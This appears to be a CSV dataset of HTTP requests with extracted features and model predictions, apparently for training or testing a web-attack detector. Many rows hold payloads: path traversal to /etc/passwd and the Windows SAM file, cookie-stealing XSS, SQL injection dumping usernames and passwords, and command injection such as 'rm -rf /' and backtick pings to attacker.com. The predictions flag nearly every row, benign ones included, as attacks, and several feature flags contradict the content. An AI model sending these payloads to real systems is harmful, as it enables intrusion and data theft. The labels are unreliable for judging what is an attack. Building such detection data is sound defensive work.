Method,URL,content,content-type,Cookie,Length,User-Agent,classification,url_length,path_depth,query_length,param_count,content_length,content_numbers,content_special_chars,has_hex_encoding,has_base64,contains_special_chars,contains_sql_injection,contains_xss,contains_command_injection,Accept,cookie,predicted_class,attack_probability
0,/api/v1/resources/1,param1=i91O2Gce&param2=LkDR2,0,50,185,3,0,19,4,0,0,28,6,3,0,0,0,0,0,1,0,,1,0.99993515
0,/users/profile/ujymrN6C,,1,538,271,3,0,23,3,0,0,3,0,0,0,1,0,0,0,0,0,,1,0.9998752
0,/download?file=..\..\..\windows\system32\config\sam,,1,895,1489,7,1,51,1,41,1,3,0,0,0,1,0,0,0,0,0,,1,0.9999305
0,/download?file=..\..\..\windows\system32\config\sam,,0,1512,156,6,1,51,1,41,1,3,0,0,0,1,0,0,0,0,0,,1,0.9999305
0,/api/v1/resources/50,param1=oTUKXKgB&param2=inL5w,2,2364,381,4,0,20,4,0,0,28,3,3,0,0,0,0,0,1,0,,1,0.99993515
3,/users/profile/5SeN3jbe,,2,327,295,4,0,23,3,0,0,3,0,0,0,1,0,0,0,0,0,,1,0.9998752
2,/api/v1/resources/4,param1=hFTJuUna&param2=aabNg,0,1043,291,1,0,19,4,0,0,28,2,3,0,0,0,0,0,1,0,,1,0.99993515
3,/users/profile/BbnJt5Kc,param1=31UocZFt&param2=jNWzi,1,406,80,4,0,23,3,0,0,28,4,3,0,0,0,0,0,1,0,,1,0.99993515
1,/products/64,,0,257,376,3,0,12,2,0,0,3,0,0,0,1,0,0,0,0,0,,1,0.999908
1,/index.html,param1=dE6OT2TU&param2=bMgEp,2,745,363,3,0,11,1,0,0,28,4,3,0,0,0,0,0,1,0,,1,0.9999485
0,/products/35,,2,660,83,3,0,12,2,0,0,3,0,0,0,1,0,0,0,0,0,,1,0.999908
0,/api/v1/resources/11,param1=K7cjBNQ3&param2=xzM2U,1,72,351,1,0,20,4,0,0,28,5,3,0,0,0,0,0,1,0,,1,0.99993515
3,/api/v1/resources/22,,2,1403,469,1,0,20,4,0,0,3,0,0,0,1,0,0,0,0,0,,1,0.9998752
1,/index.html,,0,2128,475,3,0,11,1,0,0,3,0,0,0,1,0,0,0,0,0,,1,0.99990106
2,/products/65,param1=Et7FkyPX&param2=vyZ4L,1,2049,446,4,0,12,2,0,0,28,4,3,0,0,0,0,0,1,0,,1,0.9999521
1,/api/v1/resources/46,,2,2038,433,3,0,20,4,0,0,3,0,0,0,1,0,0,0,0,0,,1,0.9998752
2,/api/v1/resources/24,,0,1174,350,4,0,20,4,0,0,3,0,0,0,1,0,0,0,0,0,,1,0.9998752
0,/page?id=javascript:alert(document.cookie),comment=<img src='x' onerror='alert(1)'>,1,1571,1308,6,1,42,1,36,1,40,1,11,0,0,1,0,1,0,0,,1,0.99995255
3,/search?q=H3uuc,,0,434,104,4,0,15,1,7,1,3,0,0,0,1,0,0,0,0,0,,1,0.999879
2,/search?q=poaG6,param1=Y9GL2vkH&param2=8z84e,2,2320,309,4,0,15,1,7,1,28,7,3,0,0,0,0,0,1,0,,1,0.99993706
0,/page?id=<svg onload='alert(1)'>,"comment='""><script>alert(1)</script>",0,521,321,6,1,32,1,26,1,36,1,11,0,0,1,0,1,0,0,,1,0.99995255
2,/users/profile/oWjwmXxN,,0,119,49,1,0,23,3,0,0,3,0,0,0,1,0,0,0,0,0,,1,0.9998752
2,/products/22,param1=7V2iwWKf&param2=vGKYa,2,1893,196,1,0,12,2,0,0,28,4,3,0,0,0,0,0,1,0,,1,0.9999521
1,/api/v1/resources/19,,1,1736,155,3,0,20,4,0,0,3,0,0,0,1,0,0,0,0,0,,1,0.9998752
1,/index.html,param1=L61KAIZU&param2=agtRB,2,141,181,3,0,11,1,0,0,28,4,3,0,0,0,0,0,1,0,,1,0.9999485
0,/index.html,param1=QhrogPeO&param2=ioFkn,1,628,99,3,0,11,1,0,0,28,2,3,0,0,0,0,0,1,0,,1,0.9999485
2,/search?q=kfDVj,,1,2357,222,1,0,15,1,7,1,3,0,0,0,1,0,0,0,0,0,,1,0.999879
2,/products/41,,2,1729,234,3,0,12,2,0,0,3,0,0,0,1,0,0,0,0,0,,1,0.999908
2,/execute?cmd=ping || whoami,command=ls | cat /etc/passwd,0,1396,1660,5,1,27,1,18,1,28,0,4,0,0,0,0,0,1,0,,1,0.9999573
1,/users/profile/adpVdMle,param1=uTRzz9hk&param2=eVg7D,2,1872,409,1,0,23,3,0,0,28,4,3,0,0,0,0,0,1,0,,1,0.99993515
0,/execute?cmd=ping `ping -c 4 attacker.com`,command=ls `ping -c 4 attacker.com`,1,57,665,5,1,42,1,33,1,35,1,5,0,0,0,0,0,1,0,,1,0.9999651
2,/page?id=<img src='x' onerror='alert(1)'>,comment=<script>alert('XSS')</script>,1,630,1051,6,1,41,1,35,1,37,0,10,0,0,1,0,1,0,0,,1,0.9999497
1,/users/profile/NzQTN7Qc,param1=q9KSIykB&param2=3yIaA,2,2041,93,1,0,23,3,0,0,28,4,3,0,0,0,0,0,1,0,,1,0.99993515
1,/index.html,param1=SCBxKGzA&param2=h6XM7,2,354,252,3,0,11,1,0,0,28,4,3,0,0,0,0,0,1,0,,1,0.9999485
2,/api/v1/resources/18,param1=giGV9ryn&param2=akoSX,1,2122,406,4,0,20,4,0,0,28,3,3,0,0,0,0,0,1,0,,1,0.99993515
3,/search?q=khW5A,param1=XNVY2Sv1&param2=rIKWI,2,651,189,4,0,15,1,7,1,28,4,3,0,0,0,0,0,1,0,,1,0.99993706
2,/execute?cmd=ping ; rm -rf /,command=ls & net user,0,1667,1638,2,1,28,2,19,1,21,0,2,0,0,1,0,0,1,0,,1,0.999956
2,"/search?q=' UNION SELECT username, password FROM users --",username=1; SELECT * FROM information_schema.tables,1,2234,752,6,1,57,1,49,1,51,1,5,0,0,1,1,0,1,0,,1,0.9999678
2,/search?q=MY92O,,0,195,309,1,0,15,1,7,1,3,0,0,0,1,0,0,0,0,0,,1,0.999879
0,/api/v1/resources/20,param1=DJxymUjO&param2=tZw8i,1,1382,204,3,0,20,4,0,0,28,3,3,0,0,0,0,0,1,0,,1,0.99993515
2,"/search?q=' UNION SELECT username, password FROM users --",username=1; SELECT * FROM information_schema.tables,1,2156,980,5,1,57,1,49,1,51,1,5,0,0,1,1,0,1,0,,1,0.9999678
2,/index.html,param1=P6Z3V3Ej&param2=D9QqS,0,1120,500,3,0,11,1,0,0,28,6,3,0,0,0,0,0,1,0,,1,0.9999485
3,/search?q=nFs03,param1=pmHXIx8P&param2=dpN0M,0,1175,498,4,0,15,1,7,1,28,4,3,0,0,0,0,0,1,0,,1,0.99993706
3,/search?q=vaLCD,,1,899,260,4,0,15,1,7,1,3,0,0,0,1,0,0,0,0,0,,1,0.999879
3,/index.html,,0,1390,147,4,0,11,1,0,0,3,0,0,0,1,0,0,0,0,0,,1,0.99990106
3,/search?q=SH3aB,param1=Q1LhW1wJ&param2=aeB3Q,1,2202,408,4,0,15,1,7,1,28,5,3,0,0,0,0,0,1,0,,1,0.99993706
2,/products/54,,1,820,220,1,0,12,2,0,0,3,0,0,0,1,0,0,0,0,0,,1,0.999908
2,/index.html,param1=ajaZlsAw&param2=cB5kb,2,179,346,3,0,11,1,0,0,28,3,3,0,0,0,0,0,1,0,,1,0.9999485
2,/users/profile/DrHRLWAu,,2,618,202,4,0,23,3,0,0,3,0,0,0,1,0,0,0,0,0,,1,0.9998752
3,/index.html,,1,1182,234,3,0,11,1,0,0,3,0,0,0,1,0,0,0,0,0,,1,0.99990106
0,/page?id=<img src='x' onerror='alert(1)'>,comment=<img src='x' onerror='alert(1)'>,1,1143,1277,2,1,41,1,35,1,40,1,11,0,0,1,0,1,0,0,,1,0.99995255
2,/execute?cmd=ping & net user,command=ls | cat /etc/passwd,0,2363,1919,6,1,28,1,19,2,28,0,4,0,0,0,0,0,1,0,,1,0.99994016
2,/page?id=<script>alert('XSS')</script>,comment=javascript:alert(document.cookie),1,852,880,7,1,38,2,32,1,41,0,5,0,0,1,0,1,0,0,,1,0.9999591
1,/products/75,,0,1994,207,4,0,12,2,0,0,3,0,0,0,1,0,0,0,0,0,,1,0.999908
2,/api/v1/resources/20,,0,2066,425,4,0,20,4,0,0,3,0,0,0,1,0,0,0,0,0,,1,0.9998752
3,/api/v1/resources/13,,2,989,31,3,0,20,4,0,0,3,0,0,0,1,0,0,0,0,0,,1,0.9998752
1,/api/v1/resources/49,param1=ta4ckbL7&param2=oWRP3,0,2115,436,1,0,20,4,0,0,28,5,3,0,0,0,0,0,1,0,,1,0.99993515
2,/execute?cmd=ping & net user,command=ls `ping -c 4 attacker.com`,0,33,1951,6,1,28,1,19,2,35,1,5,0,0,0,0,0,1,0,,1,0.9999511
2,/api/v1/resources/37,param1=B1w4AYc9&param2=OCjpf,2,2350,160,3,0,20,4,0,0,28,5,3,0,0,0,0,0,1,0,,1,0.99993515
0,/execute?cmd=ping || whoami,command=ls || whoami,1,415,701,5,1,27,1,18,1,20,0,3,0,0,0,0,0,1,0,,1,0.9999573
2,/products/54,,0,112,353,1,0,12,2,0,0,3,0,0,0,1,0,0,0,0,0,,1,0.999908
2,/search?q=admin' --,username=1' OR '1'='1,1,2285,1619,7,1,19,1,11,1,21,3,6,0,0,1,0,0,0,0,,1,0.9999428
3,/index.html,param1=s4ssyUkw&param2=oLZ6t,0,1397,409,1,0,11,1,0,0,28,4,3,0,0,0,0,0,1,0,,1,0.9999485
3,/api/v1/resources/13,param1=gDHu8sJU&param2=bwCs3,2,345,258,4,0,20,4,0,0,28,4,3,0,0,0,0,0,1,0,,1,0.99993515
2,/execute?cmd=ping || whoami,command=ls & net user,0,2431,174,6,1,27,1,18,1,21,0,2,0,0,0,0,0,1,0,,1,0.9999573
2,/index.html,,0,1824,206,1,0,11,1,0,0,3,0,0,0,1,0,0,0,0,0,,1,0.99990106
0,/search?q=rJUCq,,2,1511,421,3,0,15,1,7,1,3,0,0,0,1,0,0,0,0,0,,1,0.999879
1,/api/v1/resources/37,param1=QdKt9A55&param2=sqS7y,1,465,471,4,0,20,4,0,0,28,6,3,0,0,0,0,0,1,0,,1,0.99993515
3,/products/27,,2,334,38,3,0,12,2,0,0,3,0,0,0,1,0,0,0,0,0,,1,0.999908
2,/search?q=HjagS,,0,1801,339,3,0,15,1,7,1,3,0,0,0,1,0,0,0,0,0,,1,0.999879
0,/index.html,,0,1974,444,1,0,11,1,0,0,3,0,0,0,1,0,0,0,0,0,,1,0.99990106
3,/api/v1/resources/21,param1=baXJx9Uv&param2=JtZJj,0,1301,127,1,0,20,4,0,0,28,3,3,0,0,0,0,0,1,0,,1,0.99993515
0,/index.html,,1,303,455,4,0,11,1,0,0,3,0,0,0,1,0,0,0,0,0,,1,0.99990106
2,/index.html,,0,2448,19,1,0,11,1,0,0,3,0,0,0,1,0,0,0,0,0,,1,0.99990106
1,/products/44,,2,1338,486,4,0,12,2,0,0,3,0,0,0,1,0,0,0,0,0,,1,0.999908
1,/users/profile/uWmlTeaw,,1,1198,62,3,0,23,3,0,0,3,0,0,0,1,0,0,0,0,0,,1,0.9998752
2,/api/v1/resources/22,param1=WWrY7fhJ&param2=EVn9D,2,1938,97,3,0,20,4,0,0,28,4,3,0,0,0,0,0,1,0,,1,0.99993515
0,/index.html,,0,1212,205,1,0,11,1,0,0,3,0,0,0,1,0,0,0,0,0,,1,0.99990106
1,/products/45,param1=3YtbvN4W&param2=Hthti,2,1811,47,1,0,12,2,0,0,28,4,3,0,0,0,0,0,1,0,,1,0.9999521
0,/page?id=<svg onload='alert(1)'>,comment=<script>alert('XSS')</script>,1,2406,864,5,1,32,1,26,1,37,0,10,0,0,1,0,1,0,0,,1,0.9999497
1,/api/v1/resources/6,,0,578,287,4,0,19,4,0,0,3,0,0,0,1,0,0,0,0,0,,1,0.9998752
3,/search?q=p4zPC,,2,2336,394,4,0,15,1,7,1,3,0,0,0,1,0,0,0,0,0,,1,0.999879
2,/execute?cmd=ping ; rm -rf /,command=ls & net user,0,1128,1791,6,1,28,2,19,1,21,0,2,0,0,1,0,0,1,0,,1,0.999956
1,/index.html,,1,2045,70,1,0,11,1,0,0,3,0,0,0,1,0,0,0,0,0,,1,0.99990106
1,/users/profile/1vNJkn4v,,1,550,212,4,0,23,3,0,0,3,0,0,0,1,0,0,0,0,0,,1,0.9998752
2,/products/45,param1=ECqjfFI5&param2=0pLJF,1,2291,245,4,0,12,2,0,0,28,4,3,0,0,0,0,0,1,0,,1,0.9999521
1,/search?q=n6n2z,,1,1164,94,3,0,15,1,7,1,3,0,0,0,1,0,0,0,0,0,,1,0.999879
3,/search?q=xeGjx,,1,1056,258,3,0,15,1,7,1,3,0,0,0,1,0,0,0,0,0,,1,0.999879
3,/index.html,,2,1887,22,1,0,11,1,0,0,3,0,0,0,1,0,0,0,0,0,,1,0.99990106
2,/search?q=Bhvxl,,2,589,62,4,0,15,1,7,1,3,0,0,0,1,0,0,0,0,0,,1,0.999879
3,/users/profile/97qmWIJD,,1,433,314,3,0,23,3,0,0,3,0,0,0,1,0,0,0,0,0,,1,0.9998752
1,/users/profile/C2yOWrqV,,0,153,462,4,0,23,3,0,0,3,0,0,0,1,0,0,0,0,0,,1,0.9998752
2,/execute?cmd=ping `ping -c 4 attacker.com`,command=ls `ping -c 4 attacker.com`,0,2022,1394,2,1,42,1,33,1,35,1,5,0,0,0,0,0,1,0,,1,0.9999651
2,/download?file=/var/www/html/config.php,,0,1567,386,0,1,39,5,29,1,3,0,0,0,1,0,0,0,0,0,,1,0.99992836
2,/page?id=<script>alert('XSS')</script>,comment=<script>alert('XSS')</script>,1,2176,1568,7,1,38,2,32,1,37,0,10,0,0,1,0,1,0,0,,1,0.9999474
2,/search?q=gPXr1,,1,871,67,1,0,15,1,7,1,3,0,0,0,1,0,0,0,0,0,,1,0.999879
1,/users/profile/83ZFjFqd,param1=OiyfmgPJ&param2=MRp7G,0,1091,370,4,0,23,3,0,0,28,3,3,0,0,0,0,0,1,0,,1,0.99993515
0,/page?id=<svg onload='alert(1)'>,comment=<svg onload='alert(1)'>,1,696,928,6,1,32,1,26,1,31,1,8,0,0,1,0,1,0,0,,1,0.99995255
0,/page?id=<svg onload='alert(1)'>,comment=<script>alert('XSS')</script>,0,1123,527,5,1,32,1,26,1,37,0,10,0,0,1,0,1,0,0,,1,0.9999497
3,/api/v1/resources/4,,1,962,496,4,0,19,4,0,0,3,0,0,0,1,0,0,0,0,0,,1,0.9998752
3,/products/6,param1=VB0ejk9S&param2=EcmCh,1,2471,208,1,0,11,2,0,0,28,4,3,0,0,0,0,0,1,0,,1,0.9999521
2,/users/profile/zuVgQ4ut,,1,2021,349,1,0,23,3,0,0,3,0,0,0,1,0,0,0,0,0,,1,0.9998752
3,/users/profile/GSBYx0Ol,,1,1949,455,1,0,23,3,0,0,3,0,0,0,1,0,0,0,0,0,,1,0.9998752
2,/products/2,param1=SeXSKkET&param2=lNpRJ,2,1868,78,4,0,11,2,0,0,28,2,3,0,0,0,0,0,1,0,,1,0.9999521
0,/products/71,,1,2238,116,3,0,12,2,0,0,3,0,0,0,1,0,0,0,0,0,,1,0.999908
2,/search?q=1; SELECT * FROM information_schema.tables,"username=' UNION SELECT username, password FROM users --",0,694,857,6,1,52,1,44,1,56,0,5,0,0,1,1,0,1,0,,1,0.99996066
0,/search?q=0PCyj,,0,1626,115,1,0,15,1,7,1,3,0,0,0,1,0,0,0,0,0,,1,0.999879
2,/index.html,,2,1224,105,3,0,11,1,0,0,3,0,0,0,1,0,0,0,0,0,,1,0.99990106
2,/download?file=file:///etc/passwd,,1,1661,1916,2,1,33,5,23,1,3,0,0,0,1,0,0,0,0,0,,1,0.99992836
0,/search?q=9YBXS,param1=31RqG2DL&param2=OCW45,0,144,122,4,0,15,1,7,1,28,7,3,0,0,0,0,0,1,0,,1,0.99993706
2,/api/v1/resources/24,,2,2355,430,1,0,20,4,0,0,3,0,0,0,1,0,0,0,0,0,,1,0.9998752
2,/products/53,param1=01E21BUO&param2=8NoWk,2,1561,16,1,0,12,2,0,0,28,7,3,0,0,0,0,0,1,0,,1,0.9999521
1,/api/v1/resources/16,,0,2235,341,3,0,20,4,0,0,3,0,0,0,1,0,0,0,0,0,,1,0.9998752
0,/index.html,param1=SJzivkVw&param2=qBVJa,2,1088,469,1,0,11,1,0,0,28,2,3,0,0,0,0,0,1,0,,1,0.9999485
0,/download?file=file:///etc/passwd,,1,100,1203,6,1,33,5,23,1,3,0,0,0,1,0,0,0,0,0,,1,0.99992836
2,/index.html,,1,127,479,3,0,11,1,0,0,3,0,0,0,1,0,0,0,0,0,,1,0.99990106
1,/users/profile/ViVLVGtM,,0,1538,487,1,0,23,3,0,0,3,0,0,0,1,0,0,0,0,0,,1,0.9998752
1,/users/profile/N1Yyrqko,,2,1418,411,1,0,23,3,0,0,3,0,0,0,1,0,0,0,0,0,,1,0.9998752
0,/products/85,,0,1110,352,1,0,12,2,0,0,3,0,0,0,1,0,0,0,0,0,,1,0.999908
1,/api/v1/resources/19,param1=aZNujJS0&param2=oVxCo,2,1159,496,3,0,20,4,0,0,28,3,3,0,0,0,0,0,1,0,,1,0.99993515
0,/api/v1/resources/2,,0,1768,84,1,0,19,4,0,0,3,0,0,0,1,0,0,0,0,0,,1,0.9998752
0,/api/v1/resources/40,,2,120,381,4,0,20,4,0,0,3,0,0,0,1,0,0,0,0,0,,1,0.9998752
1,/api/v1/resources/40,param1=pHnVBS4B&param2=a1R3l,2,1929,26,1,0,20,4,0,0,28,5,3,0,0,0,0,0,1,0,,1,0.99993515
2,/execute?cmd=ping `ping -c 4 attacker.com`,command=ls | cat /etc/passwd,0,2307,1022,6,1,42,1,33,1,28,0,4,0,0,0,0,0,1,0,,1,0.9999573
3,/index.html,param1=UznWigAV&param2=6EROz,2,671,405,1,0,11,1,0,0,28,3,3,0,0,0,0,0,1,0,,1,0.9999485
1,/products/100,param1=rMWY3kTP&param2=utAuP,2,2434,349,1,0,13,2,0,0,28,3,3,0,0,0,0,0,1,0,,1,0.9999521
2,/search?q=' OR 1=1 --,username=1; SELECT * FROM information_schema.tables,0,1262,1820,2,1,21,1,13,1,51,1,5,0,0,1,1,0,1,0,,1,0.9999678
2,/search?q=TDTui,param1=Ue7Tf1wb&param2=f8tVG,2,2361,304,4,0,15,1,7,1,28,5,3,0,0,0,0,0,1,0,,1,0.99993706
2,/search?q='; DROP TABLE users; --,username=admin' --,1,1471,1060,2,1,33,1,25,1,18,0,4,0,0,1,1,0,1,0,,1,0.99996066
2,/api/v1/resources/18,param1=hHUt09HJ&param2=CiiQG,1,1079,392,1,0,20,4,0,0,28,4,3,0,0,0,0,0,1,0,,1,0.99993515
0,/users/profile/WpU7FOEi,param1=p9Y5uLix&param2=tBxWA,2,712,261,4,0,23,3,0,0,28,4,3,0,0,0,0,0,1,0,,1,0.99993515
2,/products/38,,0,145,101,4,0,12,2,0,0,3,0,0,0,1,0,0,0,0,0,,1,0.999908
0,/execute?cmd=ping & net user,command=ls `ping -c 4 attacker.com`,0,2170,163,2,1,28,1,19,2,35,1,5,0,0,0,0,0,1,0,,1,0.9999511
0,/execute?cmd=ping & net user,command=ls || whoami,0,1904,404,5,1,28,1,19,2,20,0,3,0,0,0,0,0,1,0,,1,0.99994016
0,/page?id=<script>alert('XSS')</script>,"comment='""><script>alert(1)</script>",0,1858,746,7,1,38,2,32,1,36,1,11,0,0,1,0,1,0,0,,1,0.9999505
2,/index.html,param1=IcHyKJh3&param2=caHKr,2,2439,285,1,0,11,1,0,0,28,3,3,0,0,0,0,0,1,0,,1,0.9999485
3,/users/profile/uCQHjsFv,param1=MQcciUN3&param2=62uHp,0,1708,326,1,0,23,3,0,0,28,5,3,0,0,0,0,0,1,0,,1,0.99993515
2,/api/v1/resources/28,,2,399,285,1,0,20,4,0,0,3,0,0,0,1,0,0,0,0,0,,1,0.9998752
0,/users/profile/fYHElQrt,param1=gxvZisgz&param2=Zb3h4,2,610,426,3,0,23,3,0,0,28,4,3,0,0,0,0,0,1,0,,1,0.99993515
3,/api/v1/resources/15,param1=uneE2W9e&param2=nAUhO,1,2020,225,1,0,20,4,0,0,28,4,3,0,0,0,0,0,1,0,,1,0.99993515
2,/index.html,param1=r7DsPu2M&param2=eOflI,1,724,246,3,0,11,1,0,0,28,4,3,0,0,0,0,0,1,0,,1,0.9999485
3,/products/60,,2,2013,216,1,0,12,2,0,0,3,0,0,0,1,0,0,0,0,0,,1,0.999908
2,/search?q=vskfH,,0,1169,17,1,0,15,1,7,1,3,0,0,0,1,0,0,0,0,0,,1,0.999879
2,/users/profile/ECl4erNe,,1,2497,288,4,0,23,3,0,0,3,0,0,0,1,0,0,0,0,0,,1,0.9998752
2,/execute?cmd=ping || whoami,command=ls | cat /etc/passwd,1,1506,668,5,1,27,1,18,1,28,0,4,0,0,0,0,0,1,0,,1,0.9999573
0,/api/v1/resources/20,param1=pjs5kumd&param2=bp1fC,0,492,394,1,0,20,4,0,0,28,4,3,0,0,0,0,0,1,0,,1,0.99993515
1,/index.html,,2,486,46,4,0,11,1,0,0,3,0,0,0,1,0,0,0,0,0,,1,0.99990106
0,/api/v1/resources/43,param1=yWO7e2Iu&param2=vrE7K,0,891,20,3,0,20,4,0,0,28,5,3,0,0,0,0,0,1,0,,1,0.99993515
3,/api/v1/resources/7,,2,1337,139,3,0,19,4,0,0,3,0,0,0,1,0,0,0,0,0,,1,0.9998752
0,/search?q=EJ1T1,param1=7Yl7CqFW&param2=Tjo2y,2,1606,450,1,0,15,1,7,1,28,5,3,0,0,0,0,0,1,0,,1,0.99993706
2,/execute?cmd=ping ; rm -rf /,command=ls ; rm -rf /,1,2135,457,5,1,28,2,19,1,21,0,4,0,0,1,0,0,1,0,,1,0.999956
3,/users/profile/j8YS57Fr,param1=loU02ern&param2=l6SHc,2,1249,98,3,0,23,3,0,0,28,5,3,0,0,0,0,0,1,0,,1,0.99993515
2,/search?q='; DROP TABLE users; --,username=admin' --,1,1621,1972,7,1,33,1,25,1,18,0,4,0,0,1,1,0,1,0,,1,0.99996066
2,/products/48,,1,2147,46,3,0,12,2,0,0,3,0,0,0,1,0,0,0,0,0,,1,0.999908
2,/products/28,,2,848,127,4,0,12,2,0,0,3,0,0,0,1,0,0,0,0,0,,1,0.999908
2,/page?id=<script>alert('XSS')</script>,comment=<img src='x' onerror='alert(1)'>,0,1484,929,6,1,38,2,32,1,40,1,11,0,0,1,0,1,0,0,,1,0.9999505
3,/search?q=HoJnY,param1=eDOBN6qS&param2=klYsp,2,1148,366,3,0,15,1,7,1,28,3,3,0,0,0,0,0,1,0,,1,0.99993706
2,/users/profile/usz1Couj,,2,1764,364,3,0,23,3,0,0,3,0,0,0,1,0,0,0,0,0,,1,0.9998752
1,/api/v1/resources/43,param1=W5DpwVEA&param2=jDldn,2,329,401,3,0,20,4,0,0,28,3,3,0,0,0,0,0,1,0,,1,0.99993515
2,/api/v1/resources/6,param1=PRIt1Mtz&param2=BIE5u,1,577,26,1,0,19,4,0,0,28,4,3,0,0,0,0,0,1,0,,1,0.99993515
0,/download?file=file:///etc/passwd,,1,1500,1469,0,1,33,5,23,1,3,0,0,0,1,0,0,0,0,0,,1,0.99992836
0,/search?q=bieuB,,1,370,474,4,0,15,1,7,1,3,0,0,0,1,0,0,0,0,0,,1,0.999879
0,/api/v1/resources/23,param1=A4dj4qFn&param2=uJiU5,0,2094,398,1,0,20,4,0,0,28,5,3,0,0,0,0,0,1,0,,1,0.99993515
0,/execute?cmd=ping | cat /etc/passwd,command=ls `ping -c 4 attacker.com`,1,1995,1566,5,1,35,3,26,1,35,1,5,0,0,0,0,0,1,0,,1,0.999964
2,/api/v1/resources/24,,2,1750,333,3,0,20,4,0,0,3,0,0,0,1,0,0,0,0,0,,1,0.9998752
0,/index.html,param1=6eQXrkJ9&param2=UTkrZ,1,230,436,1,0,11,1,0,0,28,4,3,0,0,0,0,0,1,0,,1,0.9999485
1,/api/v1/resources/43,,2,2378,243,3,0,20,4,0,0,3,0,0,0,1,0,0,0,0,0,,1,0.9998752
0,/users/profile/kY9uF2R2,param1=IYw9qVvu&param2=LAjHc,0,951,157,3,0,23,3,0,0,28,3,3,0,0,0,0,0,1,0,,1,0.99993515
0,/execute?cmd=ping ; rm -rf /,command=ls || whoami,1,945,723,5,1,28,2,19,1,20,0,3,0,0,1,0,0,1,0,,1,0.999956
2,/search?q=ny9oF,,0,1036,302,1,0,15,1,7,1,3,0,0,0,1,0,0,0,0,0,,1,0.999879
0,/search?q=admin' --,"username=' UNION SELECT username, password FROM users --",0,1978,1027,6,1,19,1,11,1,56,0,5,0,0,1,1,0,0,0,,1,0.9999356
0,/users/profile/cqJpq3TZ,param1=MJqzCfv5&param2=sdfzQ,2,474,27,4,0,23,3,0,0,28,3,3,0,0,0,0,0,1,0,,1,0.99993515
1,/api/v1/resources/27,param1=C1ZWtb8N&param2=aWPd3,2,1431,299,3,0,20,4,0,0,28,5,3,0,0,0,0,0,1,0,,1,0.99993515
3,/products/82,param1=yo35CbPI&param2=6zLNE,1,2414,482,4,0,12,2,0,0,28,5,3,0,0,0,0,0,1,0,,1,0.9999521
2,/download?file=../../../etc/passwd,,0,572,127,0,1,34,5,24,1,3,0,0,0,1,0,0,0,0,0,,1,0.99992836
2,/users/profile/oCAmEufB,,0,1427,289,4,0,23,3,0,0,3,0,0,0,1,0,0,0,0,0,,1,0.9998752
3,/products/31,,2,1988,200,1,0,12,2,0,0,3,0,0,0,1,0,0,0,0,0,,1,0.999908
2,/products/13,param1=OKnrEJDa&param2=TtCq3,0,1516,272,1,0,12,2,0,0,28,3,3,0,0,0,0,0,1,0,,1,0.9999521
0,/api/v1/resources/24,,2,1328,440,3,0,20,4,0,0,3,0,0,0,1,0,0,0,0,0,,1,0.9998752
2,/download?file=file:///etc/passwd,,1,52,485,0,1,33,5,23,1,3,0,0,0,1,0,0,0,0,0,,1,0.99992836
1,/index.html,,1,1882,361,1,0,11,1,0,0,3,0,0,0,1,0,0,0,0,0,,1,0.99990106
2,/users/profile/JLtYwZAz,,2,2324,272,1,0,23,3,0,0,3,0,0,0,1,0,0,0,0,0,,1,0.9998752
0,/index.html,param1=dlRo7dpj&param2=VATAb,0,683,198,4,0,11,1,0,0,28,3,3,0,0,0,0,0,1,0,,1,0.9999485
2,/products/100,,0,1539,376,4,0,13,2,0,0,3,0,0,0,1,0,0,0,0,0,,1,0.999908
0,/search?q=3lUN6,,0,1377,343,3,0,15,1,7,1,3,0,0,0,1,0,0,0,0,0,,1,0.999879
2,/products/80,param1=pwirH7li&param2=PkpH2,0,963,479,1,0,12,2,0,0,28,4,3,0,0,0,0,0,1,0,,1,0.9999521
2,/search?q=1' OR '1'='1,username=1; SELECT * FROM information_schema.tables,0,541,1250,0,1,22,1,14,1,51,1,5,0,0,1,1,0,1,0,,1,0.9999678
0,/execute?cmd=ping | cat /etc/passwd,command=ls || whoami,0,774,480,6,1,35,3,26,1,20,0,3,0,0,0,0,0,1,0,,1,0.999956
2,/api/v1/resources/7,,0,353,403,3,0,19,4,0,0,3,0,0,0,1,0,0,0,0,0,,1,0.9998752
0,/execute?cmd=ping ; rm -rf /,command=ls & net user,0,2190,873,2,1,28,2,19,1,21,0,2,0,0,1,0,0,1,0,,1,0.999956
2,/api/v1/resources/33,param1=zfDjGbpo&param2=IpzIZ,0,412,50,1,0,20,4,0,0,28,2,3,0,0,0,0,0,1,0,,1,0.99993515
1,/search?q=mOzYZ,,2,165,70,3,0,15,1,7,1,3,0,0,0,1,0,0,0,0,0,,1,0.999879
2,/search?q=rBTic,param1=TsHTUMw5&param2=wYnqu,0,2399,191,1,0,15,1,7,1,28,3,3,0,0,0,0,0,1,0,,1,0.99993706
